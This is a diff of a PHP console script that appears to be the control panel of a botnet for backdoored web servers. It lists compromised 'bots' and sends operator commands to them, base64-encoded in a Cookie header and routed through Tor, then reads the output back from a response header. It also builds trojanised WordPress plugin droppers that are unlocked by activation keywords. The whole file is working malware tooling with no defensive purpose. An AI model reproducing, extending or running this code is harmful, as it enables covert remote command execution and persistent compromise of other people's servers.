@@ -2,32 +2,30 @@
 require_once "lib/classes.inc.php";
 
 //crypto
-use crypto\certMaker\certGenerator;
+use curlStuff\defaultClient\genericClientExecuteCommands;
+use curlStuff\mainCurl;
+use curlStuff\validateMeMore\talkToMeDamnit;
+use logos\art\artisticStuff;
+use logos\menus\mainMenu;
+use new_bots\makeMeSlim\slimDropper;
+use new_bots\wordpressPlugins\makeMeWordPressing;
+use userAgents\agentsList;
+
 //end crypto
 
 //pipe dream.
-use fake_the_landing\randomDefaultPage;
 //end pipe dream.
 
 // communications
-use curlStuff\validateMeMore\talkToMeDamnit;
-use curlStuff\mainCurl;
-use userAgents\agentsList;
-use proxyWorks\confirmProxy;
 //end communications
 
 // might remove this, since tor is what should be used.
-use proxies\populateRandomProxies;
 // end stuff.
 
 // droppers
-use new_bots\makeMeSlim\slimDropper;
-use new_bots\wordpressPlugins\makeMeWordPressing;
 // end droppers
 
 //graphics and shit
-use logos\art\artisticStuff;
-use logos\menus\mainMenu;
 //end graphipcs and shit.
 
 $d = default_config;
@@ -42,38 +40,109 @@ $choices = [
     "sqlite" => $configs['sqlite_presets']
 ];
 
-if (str_contains(SQL_USE, "PGSQL")){
+if (str_contains(SQL_USE, "PGSQL")) {
     $database = new database\slopPgSql($choices['postgres']['pg_host'], $choices['postgres']['pg_user'], $choices['postgres']['pg_pass']);
     $database->firstRun();
-}else{
+} else {
 
     $database = new database\slopSqlite($choices['sqlite']['sqlite_db']);
     var_dump($database->firstRun());
     readline("Press enter to continue.");
 }
-
 $l->prepareFrames();
 $l->displayLogo();
-while (true){
+while (true) {
     system(CLEAR);
     $l->displayStaticAsciiLogo();
     $m->menu();
     $c = strtolower(trim(readline("->")));
-    switch ($c){
+    switch ($c) {
         case str_starts_with($c, "sys") !== false:
             $m->enumSystemMenu();
-            $a = new curlStuff\defaultClient\genericClientExecuteCommands();
+            $a = new genericClientExecuteCommands();
             break;
         case str_starts_with($c, "rev") !== false:
             $m->reverseConnectionsMenu();
             break;
         case str_starts_with($c, "com") !== false:
             $m->commandMenu();
-            $database->slopSqlite(['action' => "fetch"]);
-            $id = readline("\033[0;34mPlease select a bot id to use:\033[0m ->");
-            $database->slopSqlite(['action' => "grabBot", "id" => $id]);
-            var_dump($database);
-            readline("press enter.");
+            $page = 0;
+            $itemsPerPage = 10;
+            $lastId = 0;
+            $previous = 0;
+            do {
+                $lastId = $database->grabAndFormatOutput($lastId, $itemsPerPage);
+                $lastPage = ($lastId < $itemsPerPage);
+                echo "Current Page: " . ($page + 1) . "\n";
+                echo "Press 'n' for next, 'b' for back, or 'q' to quit: ";
+                $handle = fopen("php://stdin", "r");
+                $action = trim(fgets($handle));
+                fclose($handle);
+                if (is_numeric($action)) {
+                    $selectedEntry = $action;
+                    break;
+                }
+                if ($action ==='n') { // next page
+                    if (!$lastPage) {
+                        $page++;
+                        $lastId = $database->grabAndFormatOutput($lastId, $itemsPerPage);
+                        $lastPage = ($lastId < $itemsPerPage);
+                        if ($lastPage) {
+                            echo "You're on the last page.\n";
+                        }
+                    } else {
+                        echo "You're already on the last page.\n";
+                    }
+                } elseif ($action === 'b') {
+                    if ($page > 0) {
+                        $page--;
+                        $lastId -= $itemsPerPage;
+                        $lastId = $database->grabAndFormatOutput($lastId, $itemsPerPage);
+                    } else {
+                        echo "You're on the first page. Cannot go back any further.\n";
+                    }
+                }
+            } while ($action !== "q");
+            if ($action === "q"){
+                break;
+            }
+            $bot = $database->slopSqlite(['action' => "grabBot", "botID" => $selectedEntry]);
+            $coms = new genericClientExecuteCommands([
+                "base_uri" => sprintf("%s://%s", $bot[0]['proto'], $bot[0]['rhost']),
+                "timeout" => 5,
+                "allow_redirects" => false,
+                "proxy" => [
+                    "http" => $d->tor,
+                    "https" => $d->tor
+                ],
+                "cookies" => true,
+                "protocols" => $bot[0]['proto'],
+                "strict" => false,
+                "referrer" => false,
+                "track-redirects" => true
+            ]
+            );
+            try {
+                $command = $coms->head($bot[0]['uri'],
+                    [
+                        'headers' => [
+                            "cr" => "1b",
+                            "User-Agent" => $bot[0]['agent'],
+                            "Cookie" => sprintf("jsessionid=%s; %s=%s; uuid=%s; cr=1b", sprintf("%s", base64_encode(readline("What would you like to execute: "))), $bot[0]['cname'], $bot[0]['cvalue'], $bot[0]['uuid'])
+                        ]
+                    ]
+                );
+            }catch (Exception $e){
+                echo $e->getMessage().PHP_EOL;
+                readline("Exception occured....... Press enter to continue.".PHP_EOL);
+                break;
+            }
+            if (!is_null($command->getHeaderLine('D'))){
+                echo sprintf("Command completed!\n\n\033[0;35m%s\033[0m\n\n", base64_decode($command->getHeaderLine("D")));
+            }else{
+                echo "Command failed successfully.....".PHP_EOL;
+            }
+            readline("[ !! ] PRESS ENTER TO CONTINUE [ !! ]");
             break;
         case str_starts_with($c, "a") !== false:
             $m->addHostMenu();
@@ -81,10 +150,10 @@ while (true){
         case str_starts_with($c, "cr") !== false:
             $m->dropperMenu();
             $c = trim(strtolower(readline("-> ")));
-            switch ($c){
-                case str_contains($c,"small") !== false:
+            switch ($c) {
+                case str_contains($c, "small") !== false:
                     $act_word = trim(readline("Activation Keyword: "));
-                    if (is_null($act_word) or $act_word === ""){
+                    if (is_null($act_word) or $act_word === "") {
                         $act_word = bin2hex(openssl_random_pseudo_bytes(24));
                     }
                     $trj = new makeMeWordPressing($act_word, $agents->getRandomAgent(), bin2hex(openssl_random_pseudo_bytes(10)), bin2hex(openssl_random_pseudo_bytes(50)));
@@ -99,7 +168,7 @@ while (true){
                     break;
                 case str_contains($c, "chonker") !== false:
                     $act_word = trim(readline("Activation Keyword: "));
-                    if (is_null($act_word) or $act_word === ""){
+                    if (is_null($act_word) or $act_word === "") {
                         $act_word = bin2hex(openssl_random_pseudo_bytes(24));
                     }
                     $trj = new makeMeWordPressing($act_word, $agents->getRandomAgent(), bin2hex(openssl_random_pseudo_bytes(10)), bin2hex(openssl_random_pseudo_bytes(50)));
@@ -134,7 +203,7 @@ while (true){
             try {
                 $validateMeMore->checkMultiHost($database->grabOrFormatOutput(['type' => 'all_bots'])["bots"]);
             } catch (Exception $e) {
-                echo $e.PHP_EOL;
+                echo $e . PHP_EOL;
             }
             break;
         case str_starts_with($c, "at") !== false:
@@ -153,7 +222,7 @@ while (true){
             $m->generateCertMenu();
             break;
         case str_starts_with($c, "o") !== false:
-            echo "Current Options: ".PHP_EOL;
+            echo "Current Options: " . PHP_EOL;
             print_r($configs);
             readline("Press enter to continue.");
             break;
@@ -169,4 +238,5 @@ while (true){
             echo "\033[0;31mThat is not a valid command.";
             break;
     }
+    $c = "";
 }
